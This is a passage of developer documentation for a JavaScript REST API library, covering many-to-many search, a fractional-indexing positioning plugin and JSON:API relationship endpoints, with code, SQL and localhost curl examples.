            self: '/api/books/1/relationships/authors',
            related: '/api/books/1/authors'
          }
        }
      },
      links: { self: '/api/books/1' }
    },
    {
      type: 'books',
      id: '2',
      attributes: {
        title: 'American Gods',
        isbn: '978-0380789030',
        published_year: 2001
      },
      relationships: {
        authors: {
          data: [ { type: 'authors', id: '1' } ],
          links: {
            self: '/api/books/2/relationships/authors',
            related: '/api/books/2/authors'
          }
        }
      },
      links: { self: '/api/books/2' }
    },
    {
      type: 'books',
      id: '3',
      attributes: {
        title: 'The Shining',
        isbn: '978-0307743657',
        published_year: 1977
      },
      relationships: {
        authors: {
          data: [ { type: 'authors', id: '3' } ],
          links: {
            self: '/api/books/3/relationships/authors',
            related: '/api/books/3/authors'
          }
        }
      },
      links: { self: '/api/books/3' }
    }
  ],
  included: [
    {
      type: 'authors',
      id: '1',
      attributes: {
        name: 'Neil',
        surname: 'Gaiman',
        bio: 'British author of fiction, horror, and fantasy'
      },
      relationships: { books: { data: [] } },
      links: { self: '/api/authors/1' }
    },
    {
      type: 'authors',
      id: '2',
      attributes: {
        name: 'Terry',
        surname: 'Pratchett',
        bio: 'English humorist and fantasy author'
      },
      relationships: { books: { data: [] } },
      links: { self: '/api/authors/2' }
    },
    {
      type: 'authors',
      id: '3',
      attributes: {
        name: 'Stephen',
        surname: 'King',
        bio: 'American author of horror and supernatural fiction'
      },
      relationships: { books: { data: [] } },
      links: { self: '/api/authors/3' }
    }
  ],
  links: { self: '/api/books?include=authors' }
}

```

The include system automatically handles the JOIN through the pivot table. In simplified mode, the related resources are embedded directly. In JSON:API mode, they appear in the `included` array.

## Search (many to many)

The search functionality for many-to-many relationships allows you to filter parent resources based on attributes of their related resources through the pivot table. This is particularly powerful for queries like "find all books written by authors named Neil" or "find all authors who wrote books with 'Gods' in the title".

Using the schema definitions from above, which include cross-table search fields:

```javascript
// 1. Find books by author name (searches through the many-to-many relationship)
const books_by_neil_simplified = await api.resources.books.query({ 
  queryParams: { filters: { authorName: 'Neil' } } 
});

const books_by_neil_non_simplified = await api.resources.books.query({ 
  queryParams: { filters: { authorName: 'Neil' } }, 
  simplified: false 
});

// 2. Find authors by book title (reverse search through many-to-many)
const authors_of_gods_books_simplified = await api.resources.authors.query({ 
  queryParams: { filters: { bookTitle: 'Gods' } } 
});

const authors_of_gods_books_non_simplified = await api.resources.authors.query({ 
  queryParams: { filters: { bookTitle: 'Gods' } }, 
  simplified: false 
});

// 3. Combine searches: Find books by Neil that include full author data
const neil_books_with_authors = await api.resources.books.query({ 
  queryParams: { 
    filters: { authorName: 'Neil' },
    include: ['authors'] 
  } 
});

console.log('Books by Neil (simplified):', inspect(books_by_neil_simplified));
console.log('Books by Neil (non-simplified):', inspect(books_by_neil_non_simplified));
console.log('Authors who wrote books with "Gods" (simplified):', inspect(authors_of_gods_books_simplified));
console.log('Authors who wrote books with "Gods" (non-simplified):', inspect(authors_of_gods_books_non_simplified));
console.log('Neil books with full author data:', inspect(neil_books_with_authors));
```

**Expected Output**

```text
Books by Neil (simplified): {
  data: [
    {
      id: '1',
      title: 'Good Omens',
      isbn: '978-0060853983',
      published_year: 1990,
      authors_ids: [ '1', '2' ]
    },
    {
      id: '2',
      title: 'American Gods',
      isbn: '978-0380789030',
      published_year: 2001,
      authors_ids: [ '1' ]
    }
  ],
  links: { self: '/api/books?filters[authorName]=Neil' }
}
Books by Neil (non-simplified): {
  data: [
    {
      type: 'books',
      id: '1',
      attributes: {
        title: 'Good Omens',
        isbn: '978-0060853983',
        published_year: 1990
      },
      relationships: {
        authors: {
          data: [
            { type: 'authors', id: '1' },
            { type: 'authors', id: '2' }
          ]
        }
      },
      links: { self: '/api/books/1' }
    },
    {
      type: 'books',
      id: '2',
      attributes: {
        title: 'American Gods',
        isbn: '978-0380789030',
        published_year: 2001
      },
      relationships: {
        authors: { data: [ { type: 'authors', id: '1' } ] }
      },
      links: { self: '/api/books/2' }
    }
  ],
  links: { self: '/api/books?filters[authorName]=Neil' }
}
Authors who wrote books with "Gods" (simplified): {
  data: [
    {
      id: '1',
      name: 'Neil',
      surname: 'Gaiman',
      bio: 'British author of fiction, horror, and fantasy',
      books_ids: [ '1', '2' ]
    }
  ],
  links: { self: '/api/authors?filters[bookTitle]=Gods' }
}
Authors who wrote books with "Gods" (non-simplified): {
  data: [
    {
      type: 'authors',
      id: '1',
      attributes: {
        name: 'Neil',
        surname: 'Gaiman',
        bio: 'British author of fiction, horror, and fantasy'
      },
      relationships: {
        books: {
          data: [ { type: 'books', id: '1' }, { type: 'books', id: '2' } ]
        }
      },
      links: { self: '/api/authors/1' }
    }
  ],
  links: { self: '/api/authors?filters[bookTitle]=Gods' }
}
Neil books with full author data: {
  data: [
    {
      id: '1',
      title: 'Good Omens',
      isbn: '978-0060853983',
      published_year: 1990,
      authors_ids: [ '1', '2' ],
      authors: [
        {
          id: '1',
          name: 'Neil',
          surname: 'Gaiman',
          bio: 'British author of fiction, horror, and fantasy',
          books_ids: []
        },
        {
          id: '2',
          name: 'Terry',
          surname: 'Pratchett',
          bio: 'English humorist and fantasy author',
          books_ids: []
        }
      ]
    },
    {
      id: '2',
      title: 'American Gods',
      isbn: '978-0380789030',
      published_year: 2001,
      authors_ids: [ '1' ],
      authors: [
        {
          id: '1',
          name: 'Neil',
          surname: 'Gaiman',
          bio: 'British author of fiction, horror, and fantasy',
          books_ids: []
        }
      ]
    }
  ],
  links: { self: '/api/books?filters[authorName]=Neil&include=authors' }
}
```

The cross-table search through many-to-many relationships works by:
1. Starting from the main table (e.g., books)
2. JOINing through the pivot table (book_authors)
3. JOINing to the related table (authors)
4. Applying the filter on the related table's field

This generates SQL similar to:
```sql
SELECT books.* FROM books
JOIN book_authors ON books.id = book_authors.book_id
JOIN authors ON book_authors.author_id = authors.id
WHERE authors.name LIKE '%Neil%'
```

The system handles all the complexity of the double JOIN transparently, making it easy to search across many-to-many relationships without writing custom queries.

---

[Previous: 2.5 hasMany records (polymorphic)](./GUIDE_2_5_HasMany_Polymorphic.md) | [Back to Guide](./README.md) | [Next: 2.7 Pagination and ordering](./GUIDE_2_7_Pagination_And_Ordering.md)# Positioning Plugin Guide

The Positioning Plugin adds sophisticated ordering capabilities to your REST API resources, enabling drag-and-drop interfaces, sortable lists, and maintaining custom order across different groupings. It uses fractional indexing for infinite precision without requiring batch updates.

## Table of Contents

1. [Overview](#overview)
2. [Installation](#installation)
3. [Basic Usage](#basic-usage)
4. [Configuration Options](#configuration-options)
5. [Position Grouping](#position-grouping)
6. [API Usage](#api-usage)
7. [Real-World Examples](#real-world-examples)
8. [How It Works](#how-it-works)
9. [Migration Guide](#migration-guide)
10. [Performance Considerations](#performance-considerations)
11. [Troubleshooting](#troubleshooting)

## Overview

The Positioning Plugin provides:

- **Fractional indexing**: Insert items between any two positions without updating other records
- **Position groups**: Maintain separate orderings for different categories/statuses/projects
- **BeforeId API**: Natural interface for drag-and-drop operations
- **Automatic positioning**: Items without explicit positions are placed appropriately
- **Zero conflicts**: Multiple users can reorder simultaneously without issues

### Why Fractional Indexing?

Traditional integer-based positioning requires updating multiple records when inserting:

```sql
-- Traditional approach - requires updating many records
UPDATE tasks SET position = position + 1 WHERE position >= 3;
INSERT INTO tasks (title, position) VALUES ('New Task', 3);
```

Fractional indexing only updates the moved item:

```sql
-- Fractional approach - single record update
INSERT INTO tasks (title, position) VALUES ('New Task', 'a0m');
```

## Installation

First, ensure you have the required dependency:

```bash
npm install fractional-indexing
```

Then, use the plugin in your API:

```javascript
import { Api } from 'hooked-api';
import { RestApiPlugin } from './plugins/core/rest-api-plugin.js';
import { RestApiKnexPlugin } from './plugins/core/rest-api-knex-plugin.js';
import { PositioningPlugin } from './plugins/core/rest-api-positioning-plugin.js';

const api = new Api({
  name: 'my-api'
});

// Core plugins
await api.use(RestApiPlugin);
await api.use(RestApiKnexPlugin, { knex: knexInstance });

// Add positioning capabilities
await api.use(PositioningPlugin);
```

## Basic Usage

### Simple List Ordering

For a basic sortable list, just add the plugin:

```javascript
await api.use(PositioningPlugin);

// Define a resource
api.addResource('tasks', {
  schema: {
    title: { type: 'string', required: true },
    completed: { type: 'boolean', defaultTo: false }
    // 'position' field is automatically added
  }
});
```

Now you can create ordered tasks:

```javascript
// First task
POST /api/tasks
{
  "title": "First task"
}
// Response includes position: "a0"

// Add task at the end
POST /api/tasks
{
  "title": "Last task",
  "beforeId": null  // Explicit "place at end"
}
// Gets position: "a1"

// Insert between first and last
POST /api/tasks
{
  "title": "Middle task",
  "beforeId": 2  // Place before task with ID 2
}
// Gets position: "a0m" (between "a0" and "a1")
```

### Retrieving Ordered Lists

Lists are automatically sorted by position:

```javascript
GET /api/tasks

// Returns tasks in position order:
{
  "data": [
    { "id": 1, "attributes": { "title": "First task", "position": "a0" } },
    { "id": 3, "attributes": { "title": "Middle task", "position": "a0m" } },
    { "id": 2, "attributes": { "title": "Last task", "position": "a1" } }
  ]
}
```

## Configuration Options

Configure the plugin behavior:

```javascript
await api.use(PositioningPlugin, {
  // Position field name (default: 'position')
  field: 'sortOrder',
  
  // Grouping fields - create separate position sequences per group
  filters: ['status', 'projectId'],
  
  // Resources to exclude from positioning
  excludeResources: ['users', 'system_logs'],
  
  // Positioning strategy (currently only 'fractional' is supported)
  strategy: 'fractional',
  
  // Field name for beforeId in requests (default: 'beforeId')
  beforeIdField: 'insertBefore',
  
  // Default position for new items without beforeId (default: 'last')
  defaultPosition: 'last',  // or 'first'
  
  // Automatically create database index (default: true)
  autoIndex: true,
  
  // Maximum position string length before rebalancing (default: 50)
  rebalanceThreshold: 50
});
```

## Position Grouping

Position grouping is one of the most powerful features. It maintains separate position sequences for different combinations of field values.

### Understanding Position Groups

When you configure filters like `['status', 'projectId']`, the plugin creates independent position sequences for each unique combination:

- Project 1 + Status "todo" → positions: a0, a1, a2...
- Project 1 + Status "done" → positions: a0, a1, a2... (separate sequence!)
- Project 2 + Status "todo" → positions: a0, a1, a2... (another separate sequence!)

This means:
- The first item in each group gets position "a0"
- Items can have the same position value if they're in different groups
- Moving between groups requires explicit positioning with `beforeId`

### Kanban Board Example

```javascript
await api.use(PositioningPlugin, {
  filters: ['boardId', 'columnId']
});

api.addResource('cards', {
  schema: {
    title: { type: 'string', required: true },
    boardId: { type: 'id', required: true },
    columnId: { type: 'string', required: true },
    description: { type: 'string' }
  }
});
```

Each board/column combination maintains its own positions:

```javascript
// First card in "To Do" column
POST /api/cards
{
  "title": "Design mockups",
  "boardId": 1,
  "columnId": "todo"
}
// Position: "a0" in board 1, todo column

// Second card in "To Do" 
POST /api/cards
{
  "title": "Write tests",
  "boardId": 1,
  "columnId": "todo"
}
// Position: "a1" in board 1, todo column

// First card in "In Progress" - gets its own sequence!
POST /api/cards
{
  "title": "Implement feature",
  "boardId": 1,
  "columnId": "in-progress"
}
// Position: "a0" in board 1, in-progress column
```

### Moving Between Groups

**Important Behavior**: When you change a filter field value (like moving a card between columns), the item keeps its existing position value. The plugin does NOT automatically reassign positions when filter values change.

```javascript
// Move card from "todo" to "in-progress"
PATCH /api/cards/1
{
  "columnId": "in-progress"
}
// Result: Card moves to in-progress but KEEPS its existing position (e.g., "a0m")
// This might place it in an unexpected location in the new column!
```

To move an item to a specific position in the new group, you MUST provide a `beforeId`:

```javascript
// Move card and position it correctly
PATCH /api/cards/1
{
  "columnId": "in-progress",
  "beforeId": null  // Explicitly place at end of new column
}
// OR
PATCH /api/cards/1
{
  "columnId": "in-progress",
  "beforeId": 456  // Place before card 456 in the new column
}
```

**Why this behavior?** The plugin cannot guess where you want the item positioned in the new group. Should it go first? Last? In the middle? You must explicitly specify the desired position.

### Multi-Tenant Positioning

```javascript
await api.use(PositioningPlugin, {
  filters: ['tenantId', 'listId']
});

// Each tenant has independent position sequences
// Tenant A's positions don't affect Tenant B's positions
```

## API Usage

### Creating Items

```javascript
// Add at end (default)
POST /api/items
{ "name": "New item" }

// Add at end explicitly
POST /api/items
{ "name": "New item", "beforeId": null }

// Add at specific position
POST /api/items
{ "name": "New item", "beforeId": 123 }

// Note: Manual position values are ignored!
// The plugin always calculates positions to ensure consistency
POST /api/items
{ "name": "New item", "position": "a0abc" }  // 'position' will be recalculated!
```

### Updating Positions

```javascript
// Move item before another
PATCH /api/items/456
{ "beforeId": 789 }

// Move to end
PATCH /api/items/456
{ "beforeId": null }

// Update other fields without changing position
PATCH /api/items/456
{ "name": "Updated name" }
// Position remains unchanged

// IMPORTANT: Changing filter fields without beforeId
PATCH /api/items/456
{ "status": "done" }
// Item moves to 'done' group but KEEPS its position value!
// May appear in unexpected location in the new group
```

### Simplified Format

The plugin works with both JSON:API and simplified formats:

```javascript
// Simplified format
POST /api/items
{
  "name": "New item",
  "categoryId": 5,
  "beforeId": 10
}

// JSON:API format
POST /api/items
{
  "data": {
    "type": "items",
    "attributes": {
      "name": "New item",
      "categoryId": 5,
      "beforeId": 10
    }
  }
}
```

## Important Behaviors to Understand

### 1. Position Values are Immutable by Design

The plugin NEVER changes an item's position unless you explicitly request it with `beforeId`. This means:

- Changing filter fields (status, category, etc.) does NOT reposition the item
- The item keeps its position value when moving between groups
- You must provide `beforeId` to position items in their new group

### 2. Position Groups are Independent

Each combination of filter values creates a completely separate position space:

```javascript
// These items can all have position "a0" because they're in different groups:
item1: { projectId: 1, status: 'todo', position: 'a0' }
item2: { projectId: 1, status: 'done', position: 'a0' }  // Different status
item3: { projectId: 2, status: 'todo', position: 'a0' }  // Different project
```

### 3. BeforeId Context Matters

The `beforeId` only works within the same position group:

```javascript
// This will NOT work as expected:
PATCH /api/items/1
{
  "status": "done",
  "beforeId": 2  // Item 2 is in the 'todo' group, not 'done'!
}
// Result: Item 1 moves to 'done' but ignores beforeId (item not found in target group)
```

### 4. Manual Position Values are Ignored

The plugin always calculates positions to ensure consistency:

```javascript
// This position value will be ignored:
POST /api/items
{
  "name": "Test",
  "position": "zzz"  // Ignored! Plugin calculates actual position
}
```

### 5. Null Values in Filters

Null values in filter fields create their own position group:

```javascript
// These are THREE different position groups:
items.where({ projectId: 1, status: 'active' })   // Group 1
items.where({ projectId: 1, status: null })       // Group 2 (null status)
items.where({ projectId: null, status: 'active' }) // Group 3 (null project)
```

## Real-World Examples

### 1. Trello-Style Board

```javascript
// Configure with board and list grouping
await api.use(PositioningPlugin, {
  filters: ['boardId', 'listId']
});

// Moving a card
async function moveCard(cardId, targetListId, targetPosition) {
  const response = await fetch(`/api/cards/${cardId}`, {
    method: 'PATCH',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      listId: targetListId,
      beforeId: targetPosition  // ID of card to insert before
    })
  });
  return response.json();
}
```

### 2. Priority Task List

```javascript
// Configure with status grouping
await api.use(PositioningPlugin, {
  filters: ['status'],
  defaultPosition: 'first'  // New tasks go to top
});

// Reorder within status
async function reprioritizeTask(taskId, beforeTaskId) {
  return fetch(`/api/tasks/${taskId}`, {
    method: 'PATCH',
    body: JSON.stringify({ beforeId: beforeTaskId })
  });
}
```

### 3. Playlist Manager

```javascript
// No filters - global ordering
await api.use(PositioningPlugin, {
  field: 'playOrder'
});

// Add song to playlist
async function addToPlaylist(songId, position = null) {
  return fetch('/api/playlist-songs', {
    method: 'POST',
    body: JSON.stringify({
      songId,
      beforeId: position  // null = add to end
    })
  });
}
```

### 4. Multi-Level Navigation Menu

```javascript
// Configure with parent grouping
await api.use(PositioningPlugin, {
  filters: ['parentId'],  // Each menu level has its own ordering
  field: 'menuOrder'
});

// Create menu structure
await createMenuItem({ title: 'Products', parentId: null });  // Top level
await createMenuItem({ title: 'Software', parentId: 1 });     // Under Products
await createMenuItem({ title: 'Hardware', parentId: 1, beforeId: 2 }); // Before Software
```

## How It Works

### Fractional Indexing Algorithm

The plugin uses fractional indexing to generate position keys that can be infinitely subdivided:

1. **Initial positions**: First item gets "a0", second gets "a1", etc.
2. **Inserting between**: Between "a0" and "a1", we generate "a0m"
3. **Further subdivision**: Between "a0" and "a0m", we get "a0g"
4. **Infinite precision**: Can always find a key between any two keys

**Why these strange strings?** The fractional-indexing algorithm uses a base-62 encoding (0-9, a-z, A-Z) to create sortable strings that can be infinitely subdivided. The strings are designed to:
- Sort correctly as strings (no numeric parsing needed)
- Allow insertion between any two values
- Minimize string length growth
- Work with any database that can sort strings

### Position Calculation Flow

1. **Request arrives** with optional `beforeId`
2. **Plugin extracts** the beforeId and filter field values
3. **Determines if positioning is needed**:
   - For POST: Always calculates position
   - For PATCH/PUT: Only if `beforeId` is provided
   - Changing filter fields alone does NOT trigger repositioning
4. **Query database** for items in the same position group (based on filter fields)
5. **Calculate position**:
   - If `beforeId` is null → place at end of the group
   - If `beforeId` is 'FIRST' → place at beginning of the group
   - If `beforeId` is an ID → find that item and place before it
   - If target item not found → place at end (fail-safe behavior)
6. **Store position** in the position field
7. **Save record** with calculated position

**Key Insight**: The position is calculated relative to other items in the same "position group" (items with matching filter field values). An item with `status: 'todo'` has no position relationship with items where `status: 'done'`.

### Database Structure

The plugin automatically creates an efficient composite index:

```sql
CREATE INDEX idx_tasks_positioning ON tasks(status, projectId, position);
```

This ensures fast queries for:
- Retrieving ordered items within a group
- Finding specific positions for insertion
- Moving items between groups

## Migration Guide

### From Integer-Based Positioning

If you have existing integer positions, you can migrate gradually:

```javascript
// 1. Add the plugin (it works alongside existing positions)
await api.use(PositioningPlugin, {
  field: 'sort_order'  // Your existing field
});

// 2. New items will get fractional positions
// 3. Existing integer positions still work (treated as strings)
// 4. Optionally, batch convert integers to fractional:

async function migratePositions() {
  const items = await knex('tasks').select('id', 'sort_order');
  
  for (let i = 0; i < items.length; i++) {
    const fractionalPos = generateKeyBetween(
      i > 0 ? items[i-1].sort_order : null,
      null
    );
    
    await knex('tasks')
      .where('id', items[i].id)
      .update({ sort_order: fractionalPos });
  }
}
```

### Adding to Existing Resources

The plugin automatically adds the position field to schemas:

```javascript
// Before plugin
api.addResource('items', {
  schema: {
    name: { type: 'string' }
  }
});

// After adding plugin
// 'position' field is automatically added to the schema
```

## Performance Considerations

### Indexing

The plugin creates optimal indexes automatically:

```sql
-- For ungrouped positioning
CREATE INDEX ON items(position);

-- For grouped positioning
CREATE INDEX ON items(status, projectId, position);
```

### Query Performance

- **Retrieving ordered lists**: O(log n) with index
- **Inserting items**: O(log n) to find position + O(1) to insert
- **Moving items**: O(log n) to find positions + O(1) to update

### Position String Length

Fractional keys can grow longer with many insertions in the same spot:

- Starting positions: "a0", "a1" (2 characters)
- After many insertions: "a0zzzzz" (7+ characters)
- Plugin monitors length and can trigger rebalancing
- In practice, this rarely happens with normal usage

### Best Practices

1. **Use grouping** when items have natural categories
2. **Avoid manual positions** unless migrating data
3. **Let the plugin handle positioning** for consistency
4. **Monitor position lengths** in high-activity systems

## Troubleshooting

### Common Issues

**Items not maintaining order**
- Check that no other sorting is applied in queries
- Verify the position field contains valid fractional keys
- Ensure you're querying within the correct position group
- Remember: position values are strings, sorted lexicographically ("a10" comes before "a2"!)

**Position field not present in schema**
- The position field must exist in your schema
- Check `excludeResources` configuration
- The plugin will throw an error if the field is missing
- Look for plugin initialization errors in logs

**BeforeId not working**
- Ensure the target item exists in the same position group
- Check that filter field values match (e.g., same status, same projectId)
- Verify beforeId is a valid ID (string or number)
- Note: You cannot position relative to items in different groups

**Items appear in wrong position after moving between groups**
- This is expected behavior! Items keep their position when filter values change
- Always provide a `beforeId` when changing filter fields
- The plugin cannot guess where you want the item in the new group

**Performance degradation**
- Check if indexes were created successfully
- Monitor position string lengths
- Consider rebalancing if strings are very long

### Debug Logging

Enable debug logging to see position calculations:

```javascript
const api = new Api({
  name: 'my-api',
  logging: { level: 'debug' }
});
```

### Manual Position Management

For advanced use cases, you can work directly with positions:

```javascript
import { generateKeyBetween } from 'fractional-indexing';

// Generate a position between two items
const newPosition = generateKeyBetween('a0', 'a1'); // Returns 'a0m'

// Generate first position
const firstPosition = generateKeyBetween(null, null); // Returns 'a0'

// Generate last position after 'z5'
const lastPosition = generateKeyBetween('z5', null); // Returns 'z6'
```

## Summary

The Positioning Plugin provides a production-ready solution for maintaining custom order in your REST API resources. With fractional indexing and position grouping, it handles complex ordering requirements while maintaining excellent performance and avoiding conflicts.

Key benefits:
- **No batch updates** - Only the moved item is updated
- **Infinite precision** - Always room to insert between items
- **Natural API** - Works with drag-and-drop interfaces
- **Grouped positioning** - Separate sequences per category
- **Automatic indexes** - Optimal database performance
- **Zero conflicts** - Multiple users can reorder simultaneously

The plugin integrates seamlessly with the REST API plugin ecosystem, requiring minimal configuration while providing powerful positioning capabilities for modern applications.# REST API Relationships Plugin Guide

The REST API Relationships Plugin adds JSON:API compliant relationship endpoints to your API, allowing clients to view and manage relationships between resources as first-class citizens. This guide shows you how to use these powerful features with our book catalog system.

## Table of Contents
- [Why Use Relationship Endpoints?](#why-use-relationship-endpoints)
- [Installation](#installation)
- [Understanding Relationship Endpoints](#understanding-relationship-endpoints)
- [Working with Relationships](#working-with-relationships)
  - [Viewing Relationship Links](#viewing-relationship-links)
  - [Fetching Related Resources](#fetching-related-resources)
  - [Adding Relationships](#adding-relationships)
  - [Replacing Relationships](#replacing-relationships)
  - [Removing Relationships](#removing-relationships)
- [Relationship Types](#relationship-types)
- [Security and Permissions](#security-and-permissions)
- [Error Handling](#error-handling)
- [Best Practices](#best-practices)

## Why Use Relationship Endpoints?

Relationship endpoints provide several advantages:

1. **Efficient Relationship Management**: Add or remove related items without fetching and updating entire resources
2. **Clear API Navigation**: Self-documenting links show how resources connect
3. **Reduced Payload Size**: Fetch just relationship data without full resource details
4. **Atomic Operations**: Manage relationships in isolation with proper transaction support

## Installation

To use relationship endpoints, install the plugin after your core REST API setup:

```javascript
import { RestApiPlugin, RestApiKnexPlugin } from 'json-rest-api';
import { Api } from 'hooked-api';

const api = new Api();

// Core plugins first
await api.use(RestApiPlugin, {
  resourceUrlPrefix: '/api'  // Important: enables relationship links
});
await api.use(RestApiKnexPlugin, { knex });

// Define your resources as usual
await api.addResource('books', { /* schema */ });
await api.addResource('authors', { /* schema */ });
```

## Understanding Relationship Endpoints

The plugin creates two types of endpoints for each relationship:

### 1. Relationship Endpoints (Linkage)
- **URL Pattern**: `/api/{resource}/{id}/relationships/{relationshipName}`
- **Purpose**: View and manage just the linkage data (IDs and types)
- **Example**: `/api/books/1/relationships/authors`
- **Returns**: Minimal data showing which resources are connected

### 2. Related Resource Endpoints
- **URL Pattern**: `/api/{resource}/{id}/{relationshipName}`
- **Purpose**: Fetch the full related resources
- **Example**: `/api/books/1/authors`
- **Returns**: Complete resource data for all related items

## Working with Relationships

Let's explore each operation using our book catalog system.

### Setup Test Data

First, let's create some test data to work with:

```javascript
// Create a country
const usa = await api.resources.countries.post({
  name: 'United States',
  code: 'US'
});

// Create authors
const stephenKing = await api.resources.authors.post({
  name: 'Stephen King'
});

const peterStraub = await api.resources.authors.post({
  name: 'Peter Straub'
});

// Create a publisher
const scribner = await api.resources.publishers.post({
  name: 'Scribner',
  country_id: usa.id
});

// Create a book with initial relationships
const talisman = await api.resources.books.post({
  title: 'The Talisman',
  country_id: usa.id,
  publisher_id: scribner.id
}, {
  simplified: false  // Use full JSON:API format
});
```

### Viewing Relationship Links

Get just the relationship linkage data without fetching full resources:

**Programmatic:**
```javascript
const bookAuthorsRelationship = await api.resources.books.getRelationship({
  id: talisman.data.id,
  relationshipName: 'authors'
});

console.log(bookAuthorsRelationship);
// Output:
// {
//   data: [],  // Empty because we haven't added authors yet
//   links: {
//     self: "/api/books/1/relationships/authors",
//     related: "/api/books/1/authors"
//   }
// }
```

**HTTP:**
```bash
curl -X GET http://localhost:3000/api/books/1/relationships/authors

# Response:
# {
#   "data": [],
#   "links": {
#     "self": "/api/books/1/relationships/authors",
#     "related": "/api/books/1/authors"
#   }
# }
```

### Fetching Related Resources

Get the full related resources with all their attributes:

**Programmatic:**
```javascript
const bookAuthors = await api.resources.books.getRelated({
  id: talisman.data.id,
  relationshipName: 'authors',
  queryParams: {
    fields: { authors: 'name' }  // Optional: sparse fieldsets
  }
});

console.log(bookAuthors);
// Output:
// {
//   data: [
//     {
//       type: "authors",
//       id: "1",
//       attributes: { name: "Stephen King" }
//     }
//   ]
// }
```

**HTTP:**
```bash
curl -X GET 'http://localhost:3000/api/books/1/authors?fields[authors]=name'

# Response:
# {
#   "data": [
#     {
#       "type": "authors",
#       "id": "1",
#       "attributes": { "name": "Stephen King" }
#     }
#   ]
# }
```

### Adding Relationships

Add new relationships without replacing existing ones (only for to-many relationships):

**Programmatic:**
```javascript
// Add Stephen King and Peter Straub as authors
const addAuthorsResult = await api.resources.books.postRelationship({
  id: talisman.data.id,
  relationshipName: 'authors',
  inputRecord: {
    data: [
      { type: 'authors', id: stephenKing.id },
      { type: 'authors', id: peterStraub.id }
    ]
  }
});

console.log('Authors added successfully');
```

**HTTP:**
```bash
curl -X POST http://localhost:3000/api/books/1/relationships/authors \
  -H "Content-Type: application/vnd.api+json" \
  -d '{
    "data": [
      { "type": "authors", "id": "1" },
      { "type": "authors", "id": "2" }
    ]
  }'

# Response: 204 No Content (success)
```

### Replacing Relationships

Replace all existing relationships with a new set:

**Programmatic:**
```javascript
// Replace all authors with just Stephen King
const replaceAuthorsResult = await api.resources.books.patchRelationship({
  id: talisman.data.id,
  relationshipName: 'authors',
  inputRecord: {
    data: [
      { type: 'authors', id: stephenKing.id }
    ]
  }
});

// For to-one relationships, you can also set to null
const removePublisher = await api.resources.books.patchRelationship({
  id: talisman.data.id,
  relationshipName: 'publisher',
  inputRecord: {
    data: null
  }
});
```

**HTTP:**
```bash
# Replace all authors
curl -X PATCH http://localhost:3000/api/books/1/relationships/authors \
  -H "Content-Type: application/vnd.api+json" \
  -d '{
    "data": [
      { "type": "authors", "id": "1" }
    ]
  }'

# Remove publisher (set to null)
curl -X PATCH http://localhost:3000/api/books/1/relationships/publisher \
  -H "Content-Type: application/vnd.api+json" \
  -d '{
    "data": null
  }'
```

### Removing Relationships

Remove specific relationships without affecting others (only for to-many relationships):

**Programmatic:**
```javascript
// Remove Peter Straub from the book's authors
const removeAuthorResult = await api.resources.books.deleteRelationship({
  id: talisman.data.id,
  relationshipName: 'authors',
  inputRecord: {
    data: [
      { type: 'authors', id: peterStraub.id }
    ]
  }
});
```

**HTTP:**
```bash
curl -X DELETE http://localhost:3000/api/books/1/relationships/authors \
  -H "Content-Type: application/vnd.api+json" \
  -d '{
    "data": [
      { "type": "authors", "id": "2" }
    ]
  }'

# Response: 204 No Content (success)
```

## Relationship Types

The plugin handles all relationship types defined in your schema:

### belongsTo Relationships

Books belong to publishers:

```javascript
// View the publisher relationship
const bookPublisher = await api.resources.books.getRelationship({
  id: talisman.data.id,
  relationshipName: 'publisher'
});
// Returns: { data: { type: "publishers", id: "1" }, links: {...} }

// Change the publisher
await api.resources.books.patchRelationship({
  id: talisman.data.id,
  relationshipName: 'publisher',
  inputRecord: {
    data: { type: 'publishers', id: '2' }
  }
});
```

### hasOne Relationships

The inverse of belongsTo (automatically created):

```javascript
// If you define country → publishers (hasMany)
// Each publisher has one country (implicit hasOne)
const publisherCountry = await api.resources.publishers.getRelationship({
  id: scribner.id,
  relationshipName: 'country'
});
```

### hasMany Relationships

Publishers have many books:

```javascript
// View all books for a publisher
const publisherBooks = await api.resources.publishers.getRelated({
  id: scribner.id,
  relationshipName: 'books',
  queryParams: {
    sort: '-year',  // Sort by year descending
    filter: { inStock: true }  // Only in-stock books
  }
});
```

### Many-to-Many Relationships

Books have many authors through the book_authors pivot table:

```javascript
// This is the most flexible relationship type
// Supports POST (add), PATCH (replace), and DELETE (remove)
const bookAuthors = await api.resources.books.getRelationship({
  id: talisman.data.id,
  relationshipName: 'authors'
});
```

## Security and Permissions

The plugin respects your existing security setup and adds specific hooks:

```javascript
// Add permission checks for relationship operations
api.addHook('checkPermissionsGetRelationship', async ({ context }) => {
  // Check if user can view this relationship
  if (!context.auth?.userId) {
    throw new Error('Authentication required');
  }
});

api.addHook('checkPermissionsPostRelationship', async ({ context }) => {
  // Check if user can add relationships
  const { scopeName, relationshipName } = context;
  
  if (scopeName === 'books' && relationshipName === 'authors') {
    // Only editors can modify book authors
    if (context.auth?.role !== 'editor') {
      throw new Error('Only editors can modify book authors');
    }
  }
});
```

## Error Handling

Common errors you might encounter:

### Relationship Not Found
```javascript
try {
  await api.resources.books.getRelationship({
    id: '1',
    relationshipName: 'invalid'
  });
} catch (error) {
  // RestApiResourceError: Relationship 'invalid' not found on resource 'books'
}
```

### Invalid Operation
```javascript
try {
  // Can't POST to a to-one relationship
  await api.resources.books.postRelationship({
    id: '1',
    relationshipName: 'publisher',  // belongsTo is to-one
    inputRecord: { data: { type: 'publishers', id: '1' } }
  });
} catch (error) {
  // RestApiValidationError: POST operation not allowed on to-one relationship
}
```

### Resource Not Found
```javascript
try {
  await api.resources.books.getRelationship({
    id: '999',  // Non-existent book
    relationshipName: 'authors'
  });
} catch (error) {
  // RestApiResourceError: Resource not found
}
```

## Best Practices

### 1. Use Relationship Endpoints for Bulk Operations

Instead of updating each book individually to add an author:
```javascript
// ❌ Inefficient
for (const bookId of bookIds) {
  const book = await api.resources.books.get({ id: bookId });
  await api.resources.books.patch({
    id: bookId,
    inputRecord: {
      data: {
        type: 'books',
        id: bookId,
        relationships: {
          authors: {
            data: [...book.data.relationships.authors.data, newAuthor]
          }
        }
      }
    }
  });
}

// ✅ Efficient
for (const bookId of bookIds) {
  await api.resources.books.postRelationship({
    id: bookId,
    relationshipName: 'authors',
    inputRecord: {
      data: [newAuthor]
    }
  });
}
```

### 2. Use Links for API Discovery

The `links` object in responses helps clients navigate your API:
```javascript
const relationship = await api.resources.books.getRelationship({
  id: '1',
  relationshipName: 'authors'
});

console.log(relationship.links);
// {
//   self: "/api/books/1/relationships/authors",
